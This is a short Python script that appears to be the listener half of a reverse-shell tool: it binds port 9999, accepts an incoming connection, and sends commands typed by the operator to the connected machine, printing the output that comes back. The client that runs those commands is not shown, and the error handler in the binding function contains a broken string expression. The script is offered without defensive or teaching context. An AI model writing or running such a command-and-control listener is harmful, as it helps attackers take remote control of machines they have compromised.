import socket
import sys

def create_socket():
    try:
        global host
        global port
        global s
        host=""
        port=9999
        s=socket.socket()
    except socket.error as msg:
        print("socket creation error "+ str(msg))



def bind_socket():
    try:
         global host
         global port
         global s
         print("binding the port" + str(port))
         s.bind((host, port))
         s.listen(5)
    except socket.error as msg:
        print("socket binding error", +str(msg) + "\n" + "Retrying........")
        bind_socket()

def socket_accept():
    conn,address=s.accept()
    print("connection has been established....|"+"IP"+address[0]+" port" + str(address[1]))
    send_command(conn)
    conn.close()


def send_command(conn):
    while True:
        cmd=input()
        if cmd=="quit":
            conn.close()
            s.close()
            sys.exit()
        if len(str.encode(cmd)) > 0:
            conn.send(str.encode(cmd))
            client_response=str(conn.recv(1024),"utf-8")
            print(client_response,end="")

def main():
        create_socket()
        bind_socket()
        socket_accept()


main()









